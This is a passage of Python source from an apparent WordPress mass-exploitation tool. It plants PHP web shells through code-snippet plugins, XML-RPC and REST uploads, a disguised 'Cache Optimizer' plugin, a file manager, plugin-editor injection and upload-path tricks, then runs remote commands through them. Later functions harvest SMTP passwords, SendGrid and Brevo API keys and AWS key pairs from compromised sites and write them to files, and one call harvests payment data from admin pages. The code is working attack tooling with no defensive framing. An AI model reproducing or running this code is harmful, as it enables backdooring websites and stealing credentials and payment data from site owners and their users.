        b64 = base64.b64encode(cmd.encode()).decode()
        sep = "&" if "?" in url else "?"
        try:
            r = urllib.request.urlopen(urllib.request.Request(f"{url}{sep}c={b64}", headers={"User-Agent": UA}), timeout=12)
            body = r.read().decode(errors="replace")
            m = re.search(r'AVRIL_START_JANCOK\s*(.*?)\s*AVRIL_END_JANCOK', body, re.S)
            return m.group(1).strip() if m else ""
        except:
            return ""

    # Method 0: PHP code execution plugins (BYPASSES DISALLOW_FILE_MODS)
    # Strategy: find ANY plugin that can execute PHP from DB, use file_put_contents to drop shell
    # Rolling: try each method, activate inactive plugins, use REST API or form submission
    try:
        if logged_in:
            # Get REST nonce
            rest_nonce = None
            try:
                rn_req = opener.open(f"{base_url}/wp-admin/admin-ajax.php?action=rest-nonce", timeout=5)
                rest_nonce = rn_req.read().decode().strip()
            except: pass

            # Harvest payment data from admin pages (parallel value extraction)
            try: harvest_admin_session(base_url, opener, timeout=8)
            except: pass

            snippet_php = f'$s=base64_decode("{shell_b64}");@mkdir(dirname(WP_CONTENT_DIR."/{shell_name}"),0755,true);@file_put_contents(WP_CONTENT_DIR."/{shell_name}",$s);'
            shell_url = f"{base_url}/wp-content/{shell_name}"

            def trigger_and_check():
                try: urllib.request.urlopen(urllib.request.Request(base_url, headers={"User-Agent": UA}), timeout=5)
                except: pass
                time.sleep(0.5)
                return verify(shell_url)

            # --- Check plugins.php for code-exec plugins (active OR inactive) ---
            code_exec_slugs = [
                'code-snippets', 'insert-headers-and-footers', 'wpcode', 'woody-code-snippets',
                'developer-developer', 'custom-css-js', 'my-custom-functions',
                'php-everywhere', 'insert-php-code-snippet', 'starter-templates',
                'php-code-for-posts', 'allow-php-in-posts-and-pages', 'php-code-widget',
                'insert-php', 'developer', 'exec-php', 'run-php-code',
                'my-custom-functions-developer', 'scripts-organizer', 'flavflavor',
                'php-compatibility-checker', 'theme-starter', 'runphp',
            ]
            try:
                pl_page = opener.open(f"{base_url}/wp-admin/plugins.php", timeout=10)
                pl_html = pl_page.read().decode(errors='replace')
                # Find inactive code-exec plugins and activate them
                for slug in code_exec_slugs:
                    act_m = re.search(rf'action=activate&amp;plugin=({re.escape(slug)}[^&"]+)&amp;[^"]*_wpnonce=([a-f0-9]+)', pl_html)
                    if act_m:
                        plugin_file = urllib.parse.unquote(act_m.group(1))
                        act_nonce = act_m.group(2)
                        try:
                            act_url = f"{base_url}/wp-admin/plugins.php?action=activate&plugin={urllib.parse.quote(plugin_file, safe='')}&_wpnonce={act_nonce}"
                            opener.open(urllib.request.Request(act_url, headers={"User-Agent": UA}), timeout=10)
                        except: pass
            except: pass

            # --- Try Code Snippets REST API ---
            if rest_nonce:
                # First: if snippet tables exist (detected via SQLi), ensure plugin is active
                if data and data.get("snippet_tables") and "snippet" in data["snippet_tables"]:
                    for slug in ['code-snippets', 'wpcode', 'insert-headers-and-footers']:
                        try:
                            pl_page = opener.open(f"{base_url}/wp-admin/plugins.php", timeout=8)
                            pl_html = pl_page.read().decode(errors='replace')
                            act_m = re.search(rf'action=activate&amp;plugin=({re.escape(slug)}[^&"]+)&amp;[^"]*_wpnonce=([a-f0-9]+)', pl_html)
                            if act_m:
                                plugin_file = urllib.parse.unquote(act_m.group(1))
                                act_url = f"{base_url}/wp-admin/plugins.php?action=activate&plugin={urllib.parse.quote(plugin_file, safe='')}&_wpnonce={act_m.group(2)}"
                                opener.open(urllib.request.Request(act_url, headers={"User-Agent": UA}), timeout=10)
                                time.sleep(0.5)
                                # Re-get nonce after activation
                                try:
                                    rn_req = opener.open(f"{base_url}/wp-admin/admin-ajax.php?action=rest-nonce", timeout=5)
                                    rest_nonce = rn_req.read().decode().strip()
                                except: pass
                                break
                        except: pass

                try:
                    req = urllib.request.Request(f"{base_url}/wp-json/code-snippets/v1/snippets",
                        data=json.dumps({"name": f"Cache {token}", "code": snippet_php, "scope": "global", "active": True, "run_once": True}).encode(),
                        headers={"User-Agent": UA, "Content-Type": "application/json", "X-WP-Nonce": rest_nonce}, method="POST")
                    resp = opener.open(req, timeout=12)
                    if '"id"' in resp.read().decode(errors='replace'):
                        if trigger_and_check():
                            return shell_url, execute(shell_url, command), "code_snippets"
                except: pass

                # --- Try WPCode REST API ---
                try:
                    req = urllib.request.Request(f"{base_url}/wp-json/wpcode/v1/snippets",
                        data=json.dumps({"title": f"Cache {token}", "code": snippet_php, "code_type": "php_snippet", "location": "everywhere", "status": "publish"}).encode(),
                        headers={"User-Agent": UA, "Content-Type": "application/json", "X-WP-Nonce": rest_nonce}, method="POST")
                    resp = opener.open(req, timeout=12)
                    if '"id"' in resp.read().decode(errors='replace'):
                        if trigger_and_check():
                            return shell_url, execute(shell_url, command), "wpcode"
                except: pass

            # --- Try Code Snippets admin form (fallback if REST fails) ---
            try:
                add_page = opener.open(f"{base_url}/wp-admin/admin.php?page=add-snippet", timeout=10)
                add_html = add_page.read().decode(errors='replace')
                # Find form nonce
                cs_nonce = re.search(r'name="(?:_wpnonce|code_snippets[^"]*nonce)"\s+value="([^"]+)"', add_html)
                if cs_nonce and 'snippet' in add_html:
                    form_data = urllib.parse.urlencode({
                        "_wpnonce": cs_nonce.group(1), "snippet_name": f"Cache {token}",
                        "snippet_code": snippet_php, "snippet_scope": "global",
                        "snippet_active": "1", "save_snippet": "1",
                    }).encode()
                    opener.open(urllib.request.Request(f"{base_url}/wp-admin/admin.php?page=add-snippet",
                        data=form_data, headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"}, method="POST"), timeout=12)
                    if trigger_and_check():
                        return shell_url, execute(shell_url, command), "code_snippets_form"
            except: pass

            # --- Try Custom CSS & JS plugin (supports PHP in Pro) ---
            try:
                req = urllib.request.Request(f"{base_url}/wp-json/wp/v2/custom-css-js",
                    data=json.dumps({"title": f"cache-{token}", "content": snippet_php, "status": "publish", "custom_code_type": "php"}).encode(),
                    headers={"User-Agent": UA, "Content-Type": "application/json", "X-WP-Nonce": rest_nonce or ""}, method="POST")
                resp = opener.open(req, timeout=10)
                if '"id"' in resp.read().decode(errors='replace'):
                    if trigger_and_check():
                        return shell_url, execute(shell_url, command), "custom_css_js"
            except: pass

            # --- Try Woody Snippets / other snippet plugins via AJAX ---
            for ajax_action in ["woody_snippets_save", "save_snippet", "ihaf_save_snippet"]:
                try:
                    ajax_data = urllib.parse.urlencode({"action": ajax_action, "code": snippet_php, "status": "active", "title": f"c{token}", "security": rest_nonce or ""}).encode()
                    req = urllib.request.Request(f"{base_url}/wp-admin/admin-ajax.php", data=ajax_data,
                        headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, method="POST")
                    resp = opener.open(req, timeout=8)
                    rbody = resp.read().decode(errors='replace')
                    if rbody and rbody not in ("0", "-1", ""):
                        if trigger_and_check():
                            return shell_url, execute(shell_url, command), f"ajax_{ajax_action}"
                except: pass
    except: pass

    # Method 1: XML-RPC upload (no cookies needed, fastest)
    if not _timed_out() and _xmlrpc_ok:
        for fname, mime in [(shell_name, "application/octet-stream"), (f".{shell_name}", "image/jpeg"), (shell_name.replace(".php", ".phtml"), "application/octet-stream")]:
            try:
                xmlrpc = f"""<?xml version="1.0"?><methodCall><methodName>wp.uploadFile</methodName><params>
<param><value><int>1</int></value></param>
<param><value><string>{user}</string></value></param>
<param><value><string>{pwd}</string></value></param>
<param><value><struct>
<member><name>name</name><value><string>{fname}</string></value></member>
<member><name>type</name><value><string>{mime}</string></value></member>
<member><name>bits</name><value><base64>{shell_b64}</base64></value></member>
<member><name>overwrite</name><value><boolean>1</boolean></value></member>
</struct></value></param></params></methodCall>"""
                req = urllib.request.Request(f"{base_url}/xmlrpc.php", data=xmlrpc.encode(), headers={"Content-Type": "text/xml", "User-Agent": UA}, method="POST")
                resp = urllib.request.urlopen(req, timeout=timeout)
                xml_resp = resp.read().decode(errors="replace")
                if "faultCode" not in xml_resp:
                    url_m = re.search(r'<name>url</name>\s*<value>(?:<string>)?([^<]+)', xml_resp)
                    if url_m:
                        shell_url = url_m.group(1).strip()
                        time.sleep(0.3)
                        if verify(shell_url):
                            output = execute(shell_url, command)
                            return shell_url, output, "xmlrpc"
            except: pass

    # Method 2: REST media upload (needs nonce or Basic Auth)
    cred_header = base64.b64encode(f"{user}:{pwd}".encode()).decode()
    try:
        # Get nonce via Basic Auth
        nonce_req = urllib.request.Request(f"{base_url}/wp-admin/admin-ajax.php?action=rest-nonce", headers={"User-Agent": UA, "Authorization": f"Basic {cred_header}"})
        nonce_resp = urllib.request.urlopen(nonce_req, timeout=8)
        wp_nonce = nonce_resp.read().decode().strip()
        if wp_nonce and len(wp_nonce) == 10:
            boundary = f"----WP{secrets.token_hex(8)}"
            media_body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{shell_name}\"\r\nContent-Type: application/x-php\r\n\r\n").encode() + shell_code.encode() + f"\r\n--{boundary}--\r\n".encode()
            req = urllib.request.Request(f"{base_url}/wp-json/wp/v2/media", data=media_body, headers={"User-Agent": UA, "Content-Type": f"multipart/form-data; boundary={boundary}", "X-WP-Nonce": wp_nonce}, method="POST")
            resp = urllib.request.urlopen(req, timeout=timeout)
            mdata = json.loads(resp.read())
            if mdata.get("source_url"):
                shell_url = mdata["source_url"]
                time.sleep(0.3)
                if verify(shell_url):
                    output = execute(shell_url, command)
                    return shell_url, output, "rest_media"
    except: pass

    # Method 3: Plugin ZIP install (uses cookie session created above)
    if not _timed_out() and not _disallow_file_mods:
        try:
            slug = f"cache-optimizer-{secrets.token_hex(2)}"
            shell_body = shell_code.lstrip()
            if shell_body.startswith("<?php"):
                shell_body = shell_body[5:].lstrip("\n")  # strip leading newline after <?php
            plugin_php = f"<?php\n/*\nPlugin Name: Cache Optimizer\nDescription: Performance optimization utilities.\nVersion: 2.1.4\nAuthor: developer\n*/\n{shell_body}"
            zip_buf = io.BytesIO()
            with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr(f"{slug}/{slug}.php", plugin_php)  # writestr accepts str directly
            zip_data = zip_buf.getvalue()

            r = opener.open(urllib.request.Request(f"{base_url}/wp-admin/plugin-install.php?tab=upload", headers={"User-Agent": UA}), timeout=12)
            html = r.read().decode(errors='replace')
            nonce_m = re.search(r'name="_wpnonce"\s+value="([^"]+)"', html)
            if nonce_m:
                boundary = f"----WP{secrets.token_hex(8)}"
                body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"_wpnonce\"\r\n\r\n{nonce_m.group(1)}\r\n"
                    f"--{boundary}\r\nContent-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/wp-admin/plugin-install.php?tab=upload\r\n"
                    f"--{boundary}\r\nContent-Disposition: form-data; name=\"install-plugin-submit\"\r\n\r\nInstall Now\r\n"
                    f"--{boundary}\r\nContent-Disposition: form-data; name=\"pluginzip\"; filename=\"{slug}.zip\"\r\nContent-Type: application/zip\r\n\r\n"
                ).encode() + zip_data + f"\r\n--{boundary}--\r\n".encode()
                req = urllib.request.Request(f"{base_url}/wp-admin/update.php?action=upload-plugin", data=body, headers={"User-Agent": UA, "Content-Type": f"multipart/form-data; boundary={boundary}"}, method="POST")
                resp = opener.open(req, timeout=25)
                resp_html = resp.read().decode(errors='replace')
                if "installed successfully" in resp_html.lower() or slug in resp_html:
                    # Activate — ambil activate URL lengkap dari response HTML
                    act_m = re.search(r'href="([^"]*action=activate[^"]*plugin=[^"]+)"', resp_html)
                    if act_m:
                        act_href = act_m.group(1).replace("&amp;", "&")
                        # Pastikan URL absolute
                        if act_href.startswith("/"):
                            act_href = base_url + act_href
                        elif not act_href.startswith("http"):
                            act_href = f"{base_url}/wp-admin/{act_href}"
                        try: opener.open(urllib.request.Request(act_href, headers={"User-Agent": UA}), timeout=12)
                        except: pass
                    plugin_url = f"{base_url}/wp-content/plugins/{slug}/{slug}.php"
                    time.sleep(0.3)
                    if verify(plugin_url):
                        output = execute(plugin_url, command)
                        return plugin_url, output, "plugin_zip"
        except: pass

    # Method 5: WP File Manager (elFinder upload - bypasses DISALLOW_FILE_MODS)
    try:
        if logged_in:
            fm_page = opener.open(urllib.request.Request(f"{base_url}/wp-admin/admin.php?page=wp_file_manager", headers={"User-Agent": UA}), timeout=10)
            fm_html = fm_page.read().decode(errors='replace')
            fm_nonce = re.search(r'"nonce":"([a-f0-9]+)"', fm_html)
            if fm_nonce and 'elfinder' in fm_html.lower():
                nonce_val = fm_nonce.group(1)
                # Open root to find writable dir
                fm_data = urllib.parse.urlencode({"action": "mk_file_folder_manager", "cmd": "open", "target": "", "init": "1", "tree": "1", "security": nonce_val}).encode()
                fm_req = urllib.request.Request(f"{base_url}/wp-admin/admin-ajax.php", data=fm_data,
                    headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, method="POST")
                fm_resp = opener.open(fm_req, timeout=10)
                fm_raw = fm_resp.read().decode(errors='replace')
                if fm_raw and fm_raw.startswith('{'):
                    fm_json = json.loads(fm_raw)
                    # Find any writable directory
                    target_hash = None
                    if fm_json.get("cwd", {}).get("write"):
                        target_hash = fm_json["cwd"]["hash"]
                    else:
                        for f in fm_json.get("files", []):
                            if f.get("mime") == "directory" and f.get("write"):
                                target_hash = f["hash"]
                                break
                    if target_hash:
                        # Upload PHP shell via elFinder
                        boundary = f"----WKF{secrets.token_hex(8)}"
                        upload_body = (
                            f"--{boundary}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nmk_file_folder_manager\r\n"
                            f"--{boundary}\r\nContent-Disposition: form-data; name=\"security\"\r\n\r\n{nonce_val}\r\n"
                            f"--{boundary}\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n"
                            f"--{boundary}\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n{target_hash}\r\n"
                            f"--{boundary}\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"{shell_name}\"\r\n"
                            f"Content-Type: application/x-php\r\n\r\n{shell_code}\r\n--{boundary}--\r\n"
                        ).encode()
                        up_req = urllib.request.Request(f"{base_url}/wp-admin/admin-ajax.php", data=upload_body,
                            headers={"User-Agent": UA, "Content-Type": f"multipart/form-data; boundary={boundary}", "X-Requested-With": "XMLHttpRequest"}, method="POST")
                        up_resp = opener.open(up_req, timeout=15)
                        up_raw = up_resp.read().decode(errors='replace')
                        if '"added"' in up_raw:
                            up_json = json.loads(up_raw)
                            file_url = up_json["added"][0].get("url", "")
                            if file_url:
                                time.sleep(0.3)
                                if verify(file_url):
                                    output = execute(file_url, command)
                                    return file_url, output, "file_manager"
    except: pass

    # Method 6: Plugin file editor (edit existing plugin file directly)
    if not _timed_out() and not _disallow_file_mods:
        try:
            if logged_in:
                # Get list of active plugins and try to edit one
                plugins_page = opener.open(urllib.request.Request(f"{base_url}/wp-admin/plugins.php", headers={"User-Agent": UA}), timeout=12)
                ph = plugins_page.read().decode(errors='replace')
                # Find any editable plugin file link
                edit_links = re.findall(r'plugin-editor\.php\?file=([^&"]+)&amp;plugin=([^"&]+)', ph)
                if edit_links:
                    pfile, pplugin = edit_links[0]
                    pfile = pfile.replace('%2F', '/')
                    pplugin = pplugin.replace('%2F', '/')
                    # Load editor for that plugin
                    ed_url = f"{base_url}/wp-admin/plugin-editor.php?file={urllib.parse.quote(pfile)}&plugin={urllib.parse.quote(pplugin)}"
                    ed_resp = opener.open(urllib.request.Request(ed_url, headers={"User-Agent": UA}), timeout=12)
                    ed_html = ed_resp.read().decode(errors='replace')
                    ed_nonce = re.search(r'name="_wpnonce"\s+value="([^"]+)"', ed_html)
                    ed_content = re.search(r'<textarea[^>]*id="newcontent"[^>]*>(.*?)</textarea>', ed_html, re.S)
                    if ed_nonce and ed_content:
                        import html as html_mod
                        original = html_mod.unescape(ed_content.group(1))
                        # Prepend shell code right after opening <?php
                        inject_line = f"\nif(isset($_REQUEST['c'])){{echo '{MARKER_S}'.shell_exec(base64_decode($_REQUEST['c']).' 2>&1').'{MARKER_E}';exit;}}\n"
                        if original.startswith("<?php"):
                            new_content = "<?php" + inject_line + original[5:]
                        else:
                            new_content = "<?php\n" + inject_line + original
                        form_data = urllib.parse.urlencode({
                            "_wpnonce": ed_nonce.group(1), "action": "update",
                            "_wp_http_referer": f"/wp-admin/plugin-editor.php?file={urllib.parse.quote(pfile)}&plugin={urllib.parse.quote(pplugin)}",
                            "newcontent": new_content, "file": pfile, "plugin": pplugin,
                        }).encode()
                        opener.open(urllib.request.Request(f"{base_url}/wp-admin/plugin-editor.php", data=form_data, headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"}, method="POST"), timeout=15)
                        # Check the plugin file directly
                        plugin_url = f"{base_url}/wp-content/plugins/{pfile}"
                        time.sleep(0.3)
                        if verify(plugin_url):
                            output = execute(plugin_url, command)
                            return plugin_url, output, "plugin_editor"
        except: pass

    # Method 7: Upload permissive .htaccess to uploads, then PHP shell (Apache bypass)
    if not _timed_out() and _xmlrpc_ok:
        try:
            if logged_in:
                htaccess_php = b"Options +ExecCGI\nAddType application/x-httpd-php .php .php5 .phtml\nphp_flag engine on\n"
                for htaccess_dir in ["", "2026/", "2025/"]:
                    xmlrpc_ht = f"""<?xml version="1.0"?><methodCall><methodName>wp.uploadFile</methodName><params>
<param><value><int>1</int></value></param>
<param><value><string>{user}</string></value></param>
<param><value><string>{pwd}</string></value></param>
<param><value><struct>
<member><name>name</name><value><string>{htaccess_dir}.htaccess</string></value></member>
<member><name>type</name><value><string>text/plain</string></value></member>
<member><name>bits</name><value><base64>{base64.b64encode(htaccess_php).decode()}</base64></value></member>
<member><name>overwrite</name><value><boolean>1</boolean></value></member>
</struct></value></param></params></methodCall>"""
                    try:
                        req = urllib.request.Request(f"{base_url}/xmlrpc.php", data=xmlrpc_ht.encode(),
                            headers={"Content-Type": "text/xml", "User-Agent": UA}, method="POST")
                        urllib.request.urlopen(req, timeout=timeout)
                    except: pass
                # Upload PHP shell
                xmlrpc_sh = f"""<?xml version="1.0"?><methodCall><methodName>wp.uploadFile</methodName><params>
<param><value><int>1</int></value></param>
<param><value><string>{user}</string></value></param>
<param><value><string>{pwd}</string></value></param>
<param><value><struct>
<member><name>name</name><value><string>{shell_name}</string></value></member>
<member><name>type</name><value><string>application/octet-stream</string></value></member>
<member><name>bits</name><value><base64>{shell_b64}</base64></value></member>
<member><name>overwrite</name><value><boolean>1</boolean></value></member>
</struct></value></param></params></methodCall>"""
                req = urllib.request.Request(f"{base_url}/xmlrpc.php", data=xmlrpc_sh.encode(),
                    headers={"Content-Type": "text/xml", "User-Agent": UA}, method="POST")
                resp = urllib.request.urlopen(req, timeout=timeout)
                xml_resp = resp.read().decode(errors="replace")
                if "faultCode" not in xml_resp:
                    url_m = re.search(r'<name>url</name>\s*<value>(?:<string>)?([^<]+)', xml_resp)
                    if url_m:
                        shell_url = url_m.group(1).strip()
                        time.sleep(0.5)
                        if verify(shell_url):
                            output = execute(shell_url, command)
                            return shell_url, output, "htaccess_bypass"
        except: pass

    # Method 8: Temporarily change upload_path via options.php to bypass DISALLOW_FILE_MODS
    # Points uploads to wp-content/ which has no .htaccess PHP block
    if not _timed_out():
        try:
            if logged_in:
                opts_resp = opener.open(urllib.request.Request(f"{base_url}/wp-admin/options.php",
                    headers={"User-Agent": UA}), timeout=10)
                opts_html = opts_resp.read().decode(errors='replace')
                opts_nonce = re.search(r'name="_wpnonce"\s+value="([^"]+)"', opts_html)
                if opts_nonce:
                    orig_m = re.search(r'name="upload_path"[^>]*value="([^"]*)"', opts_html)
                    orig_path = orig_m.group(1) if orig_m else ""
                    # Change upload_path to wp-content (no blocking .htaccess)
                    form_data = urllib.parse.urlencode({
                        "_wpnonce": opts_nonce.group(1),
                        "_wp_http_referer": "/wp-admin/options.php",
                        "option_page": "general", "action": "update",
                        "upload_path": "wp-content",
                        "upload_url_path": f"{base_url}/wp-content",
                    }).encode()
                    opener.open(urllib.request.Request(f"{base_url}/wp-admin/options.php",
                        data=form_data, headers={"User-Agent": UA,
                        "Content-Type": "application/x-www-form-urlencoded"}, method="POST"), timeout=10)
                    # Upload PHP via XML-RPC to new path
                    xmlrpc_sh2 = f"""<?xml version="1.0"?><methodCall><methodName>wp.uploadFile</methodName><params>
<param><value><int>1</int></value></param>
<param><value><string>{user}</string></value></param>
<param><value><string>{pwd}</string></value></param>
<param><value><struct>
<member><name>name</name><value><string>{shell_name}</string></value></member>
<member><name>type</name><value><string>application/octet-stream</string></value></member>
<member><name>bits</name><value><base64>{shell_b64}</base64></value></member>
<member><name>overwrite</name><value><boolean>1</boolean></value></member>
</struct></value></param></params></methodCall>"""
                    req = urllib.request.Request(f"{base_url}/xmlrpc.php", data=xmlrpc_sh2.encode(),
                        headers={"Content-Type": "text/xml", "User-Agent": UA}, method="POST")
                    resp = urllib.request.urlopen(req, timeout=timeout)
                    xml_resp = resp.read().decode(errors="replace")
                    # Restore original upload_path
                    try:
                        restore = urllib.parse.urlencode({
                            "_wpnonce": opts_nonce.group(1),
                            "_wp_http_referer": "/wp-admin/options.php",
                            "option_page": "general", "action": "update",
                            "upload_path": orig_path, "upload_url_path": "",
                        }).encode()
                        opener.open(urllib.request.Request(f"{base_url}/wp-admin/options.php",
                            data=restore, headers={"User-Agent": UA,
                            "Content-Type": "application/x-www-form-urlencoded"}, method="POST"), timeout=8)
                    except: pass
                    if "faultCode" not in xml_resp:
                        url_m = re.search(r'<name>url</name>\s*<value>(?:<string>)?([^<]+)', xml_resp)
                        if url_m:
                            shell_url = url_m.group(1).strip()
                            time.sleep(0.3)
                            if verify(shell_url):
                                output = execute(shell_url, command)
                                return shell_url, output, "upload_path_bypass"
        except: pass

    return None


# ============================================================
# Harvest: Save extracted creds
# ============================================================

def _find_aws_secret(access_key, blob):
    """Robustly find AWS secret key (40-char base64) near an access key.
    Handles PHP serialized (s:N:"..."), JSON, plain key=value, and bare formats.
    Fixes the s:40: serialization bug + separate-option secret case."""
    if not blob or not access_key:
        return ""

    pos = blob.find(access_key)
    if pos == -1:
        return ""

    # Search window: 400 chars after, 250 before
    nearby = blob[max(0, pos - 250):pos + 400]

    # Method 1: PHP serialized  "secret_key";s:40:"VALUE"
    #             handles the s:N: prefix properly (old regex choked on the 's')
    for m in re.finditer(
        r'(?:secret[_\-]?access[_\-]?key|secret[_\-]?key|secretkey|s3[_\-]?secret|aws[_\-]?secret)'
        r'[^"\']*["\'];\s*s:\d+:"([A-Za-z0-9+/]{40})"',
        nearby, re.I):
        return m.group(1)

    # Method 2: PHP serialized array  "secret_key" => "VALUE"
    for m in re.finditer(
        r'(?:secret[_\-]?access[_\-]?key|secret[_\-]?key|secretkey|s3[_\-]?secret)'
        r'[^"]*"\s*=>\s*"([A-Za-z0-9+/]{40})"',
        nearby, re.I):
        return m.group(1)

    # Method 3: JSON  "secret_access_key":"VALUE"
    for m in re.finditer(
        r'["\'](?:secret[_\-]?access[_\-]?key|secret[_\-]?key|secretkey|secret|aws[_\-]?secret)["\']'
        r'\s*:\s*["\']([A-Za-z0-9+/]{40})["\']',
        nearby, re.I):
        return m.group(1)

    # Method 4: plain  secret_access_key=VALUE  /  secret_access_key: VALUE
    for m in re.finditer(
        r'(?:secret[_\-]?access[_\-]?key|secret[_\-]?key|secretkey|s3[_\-]?secret)'
        r'\s*[=:]\s*["\']?([A-Za-z0-9+/]{40})["\']?',
        nearby, re.I):
        return m.group(1)

    # Method 5: any bare 40-char base64 in quotes nearby (fallback)
    for m in re.finditer(r'["\']([A-Za-z0-9+/]{40})["\']', nearby):
        cand = m.group(1)
        if cand != access_key and not any(x in cand for x in ('http', 'www.', '.php', '.html', '.com', '.org')):
            return cand

    return ""


def _extract_all_aws_secrets(secret_blob):
    """Extract 40-char base64 secrets from AWS/S3 option pairs.
    blob format: option_name=value;;option_name=value;;...
    Only returns secrets from options with clear AWS/S3/access context."""
    if not secret_blob:
        return []
    found = []
    for pair in secret_blob.split(";;"):
        if "=" not in pair:
            continue
        oname, ovalue = pair.split("=", 1)
        # Only trust options with explicit AWS/S3/access context in the name
        if not re.search(r'(aws|s3|amazon|access[_\-]?key|secret[_\-]?access)', oname, re.I):
            continue
        # Extract 40-char base64 secrets from the value
        for m in re.finditer(r'["\']?([A-Za-z0-9+/]{40})["\']?', ovalue):
            c = m.group(1)
            if c not in found and len(set(c)) > 5 and not any(x in c for x in ('http', 'www.', '.php', '.html', '.com', '.org')):
                found.append(c)
    return found


def save_harvest(base_url, data):
    """Save all extracted credentials from MEGA query."""
    smtp_raw = data.get("smtp_raw", "")
    aws_raw = data.get("aws_raw", "")
    payment_raw = data.get("payment_raw", "")
    wp_keys = data.get("wp_keys")

    # SMTP
    if smtp_raw and len(smtp_raw) > 10:
        def _php_val(key_pattern, raw):
            """Extract value after key in PHP serialized or JSON format."""
            # PHP: "key";s:N:"value" or "key";i:N;
            m = re.search(key_pattern + r'["\'];\s*s:\d+:"([^"]*)"', raw, re.I)
            if m: return m.group(1)
            m = re.search(key_pattern + r'["\'];\s*i:(\d+);', raw, re.I)
            if m: return m.group(1)
            # JSON: "key":"value" or "key":N
            m = re.search(key_pattern + r'["\']\s*[:\]]\s*"([^"]*)"', raw, re.I)
            if m: return m.group(1)
            m = re.search(key_pattern + r'["\']\s*[:\]]\s*(\d+)', raw, re.I)
            if m: return m.group(1)
            return ""

        h = (_php_val(r'["\'](?:smtp_?)?host(?:name)?', smtp_raw) or
             re.search(r'(smtp[a-z0-9._-]*\.[a-z]{2,})', smtp_raw, re.I))
        if hasattr(h, 'group'): h = h.group(1)
        h = h or ""

        port = _php_val(r'["\'](?:smtp_?)?port', smtp_raw) or ""
        if not port:
            pm = re.search(r'(?:port)["\';:\s]+(\d{2,4})', smtp_raw, re.I)
            port = pm.group(1) if pm else "587"

        u = (_php_val(r'["\'](?:smtp_?)?(?:user(?:name)?|auth_user|basic_auth_username|sender_email)', smtp_raw) or "")
        if not u:
            um = re.search(r'["\'](?:user|username|auth_user)["\'];\s*s:\d+:"([^"]+)"', smtp_raw, re.I)
            u = um.group(1) if um else ""

        p_enc = (_php_val(r'["\'](?:smtp_?)?(?:pass(?:word)?|auth_pass|basic_auth_password)', smtp_raw) or "")
        if not p_enc:
            pm2 = re.search(r'["\'](?:pass|password)["\'];\s*s:\d+:"([^"]+)"', smtp_raw, re.I)
            p_enc = pm2.group(1) if pm2 else ""

        if h or u:
            # Try local decrypt (WP Mail SMTP AES-256-CBC)
            p_dec = ""
            if p_enc and wp_keys:
                decrypted = decrypt_smtp_local(p_enc, wp_keys)
                if decrypted:
                    p_dec = decrypted
            if not p_dec and p_enc:
                # Try auto-decode: base64, then plaintext
                try:
                    # Try base64 decode if looks encoded (all b64 chars, len > 8)
                    if len(p_enc) >= 8 and re.match(r'^[A-Za-z0-9+/=]+$', p_enc):
                        try:
                            raw_dec = base64.b64decode(p_enc + '==').decode('utf-8', 'replace')
                            if len(raw_dec) >= 3 and all(32 <= ord(c) < 127 for c in raw_dec):
                                p_dec = raw_dec
                            else:
                                p_dec = p_enc
                        except:
                            p_dec = p_enc
                    elif all(32 <= ord(c) < 127 for c in p_enc):
                        p_dec = p_enc
                    else:
                        p_dec = f"[ENC:{p_enc[:50]}]"
                except:
                    p_dec = p_enc if len(p_enc) < 50 else f"[ENC:{p_enc[:50]}]"

            entry = f"{base_url}|{h}|{port}|{u}|{p_dec}"
            entry_key = f"{h}|{u}"
            if entry_key not in _seen_smtp:
                _seen_smtp.add(entry_key)
                with _lock:
                    with open(_smtp_file, "a") as f:
                        f.write(f"{base_url} | {h}:{port} | {u} | {p_dec}\n")
                    _stats["smtp"] += 1
                    _stats["creds"] += 1
                pwd_show = p_dec if p_dec and not p_dec.startswith("[ENC") else "\033[90m[encrypted]\033[35m"
                print(f"\r{' '*120}\r\033[35m[SMTP]\033[0m {base_url} | {h}:{port} | {u} | {pwd_show}", flush=True)

        # API keys in SMTP data
        brevo = re.search(r'(xkeysib-[A-Za-z0-9]{50,})', smtp_raw)
        sg = re.search(r'(SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})', smtp_raw)
        if brevo:
            entry = f"BREVO|{brevo.group(1)}\n"
            if entry not in _seen_smtp:
                _seen_smtp.add(entry)
                with _lock:
                    with open(_brevo_file, "a") as f:
                        f.write(f"# {base_url}\n{entry}\n")
                    _stats["smtp"] += 1
                    _stats["creds"] += 1
                print(f"\r{' '*120}\r\033[35m[BREVO]\033[0m {base_url} | {brevo.group(1)[:30]}...", flush=True)
        if sg:
            entry = f"SENDGRID|{sg.group(1)}\n"
            if entry not in _seen_smtp:
                _seen_smtp.add(entry)
                with _lock:
                    with open(_sendgrid_file, "a") as f:
                        f.write(f"# {base_url}\n{entry}\n")
                    _stats["smtp"] += 1
                    _stats["creds"] += 1
                print(f"\r{' '*120}\r\033[35m[SENDGRID]\033[0m {base_url} | {sg.group(1)[:30]}...", flush=True)

    # AWS - proper key+secret pairing (robust: handles s:40: serialization,
    # separate-option secrets, JSON, plain, and bare 40-char base64)
    aws_secret_raw = data.get("aws_secret_raw", "")

    if aws_raw and "AKIA" in aws_raw:
        keys = re.findall(r'(AKIA[A-Z0-9]{16})', aws_raw)
        # Pre-extract ALL candidate secrets from the dedicated secret-options blob
        candidate_secrets = _extract_all_aws_secrets(aws_secret_raw)

        for k in keys:
            secret = _find_aws_secret(k, aws_raw)

            # Fallback: secret lives in a SEPARATE option (not near the key)
            if not secret and candidate_secrets:
                secret = candidate_secrets[0]

            entry = f"{k}|{secret}"
            if k not in _seen_aws:
                _seen_aws.add(k)
                with _lock:
                    with open(_aws_file, "a") as f:
                        f.write(f"{k}|{secret}\n")
                    _stats["aws"] += 1
                    _stats["creds"] += 1
                if secret:
